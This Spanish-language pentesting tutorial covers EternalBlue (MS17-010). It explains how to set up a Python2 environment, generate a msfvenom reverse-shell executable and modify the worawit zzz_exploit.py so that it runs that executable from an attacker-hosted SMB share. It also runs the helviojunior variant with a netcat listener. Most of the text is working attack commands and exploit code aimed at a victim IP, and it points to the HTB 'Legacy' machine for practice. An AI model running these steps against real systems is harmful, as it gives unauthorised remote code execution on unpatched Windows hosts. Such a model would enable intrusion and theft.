---
description: >-
  Lo explicado aquí puede ser útil para conseguir otras compatibilidades con
  Python2
---

# Eternal Blue

La mayor parte de los exploits funcionales enfocados para Eternal Blue actualmente están escritos en Python2, lo que provoca muchos fallos de compatibilidad, os propongo una forma de realizar el ataque.

## Entorno Virtualizado

Primero instalamos lo necesario:

```
sudo apt-get update
sudo apt-get install virtualenv python2-pip-whl python2-setuptools-whl
```

A continuación podemos crear nuestro entorno virtualizado:

```
virtualenv eternalblue -p $(which python2)
source eternalblue/bin/activate
```

Ya con una consola en nuestro entorno virtualizado necesitaremos la utilidad pip para python2 en este entorno:

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
```

A continuación vamos a necesitar la librería impacket:

```
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip install -r requirements.txt
pip install .
```

### Realizamos el ataque con worawit

```
git clone https://github.com/worawit/MS17-010
cd MS17-010

#Comprobamos el pipe al que tenemos acceso
python checker.py <IP>

    === Testing named pipes ===
    spoolss: Ok (32 bit)
    samr: STATUS_ACCESS_DENIED
    netlogon: STATUS_ACCESS_DENIED
    lasarpc: STATUS_ACCESS_DENIED
    browser: STATUS_ACCESS_DENIED
```

Creamos un payload con msfvenom (podríais también usar un binario de nc o lo que os resulte más cómodo para conseguir una reverse shell)

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IPatacante> LPORT=<puerto> -f exe -o shell.exe
```

Podemos entrar dentro del archivo zzz\_exploit.py y de la línea 972 a la 985 debemos hacer la modificación para poder ejecutar el código que queramos utilizar.

```python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
#	print('creating file c:\\pwned.txt on the target')
#	tid2 = smbConn.connectTree('C$')
#	fid2 = smbConn.createFile(tid2, '/pwned.txt')
#	smbConn.closeFile(tid2, fid2)
#	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	service_exec(conn, r'cmd /c \\<IPatacante>\<carpetasmb>\shell.exe')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```

Ya esta todo preparado, sabemos el pipe, hemos realizado los cambios y tenemos un ejecutable con una reverse shell:

```
#Por un lado en una consola nos quedamos a la escucha en el puerto indicado en la shell
rlwrap nc -nlvp <puerto>

#Por otro lado creamos un servicio compartido por samba donde esté nuestro shell.exe
impacket-smbclient <carpetasmb> $(pwd)

#Por último tenemos que ejecutar el zzz_exploit.py
python zzz_exploit.py <IPvíctima> <pipeabierto>
```

### Realizamos el ataque con helviojunior

Hay que seguir los siguientes pasos, una vez estamos dentro del entorno virtualizado:

```
#Descargamos el repositorio
git clone https://github.com/helviojunior/MS17-010
cd MS17-010

#Creamos una shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IPatacante> LPORT=<puerto> -f exe -o shell.exe

#Nos ponemos a la escucha en otro lado
rlwrap nc -nlvp <puerto>

#Iniciamos el exploit
python send_and_execute.py <IPvíctima> shell.exe
```

## Practicar

* Máquina "Legacy" HTB \[Acceso 17/02/2022]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.

